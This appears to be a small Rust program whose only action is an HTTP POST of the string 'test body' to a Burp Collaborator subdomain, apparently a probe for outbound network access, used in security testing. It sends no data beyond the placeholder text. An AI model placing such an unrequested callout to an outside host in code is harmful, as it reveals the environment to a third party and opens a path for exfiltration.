#![feature(async_await, await_macro)]
#[warn(unused_imports)]

use futures::{Future, Stream};
use reqwest::r#async::{Client, Decoder};

fn main() {
    let client = reqwest::Client::new();
    let res = client.post("http://6u1xcop3htubiqmotyebhtlg97fz3o.burpcollaborator.net")
        .body("test body")
        .send();
    println!("{:?}", res);
}

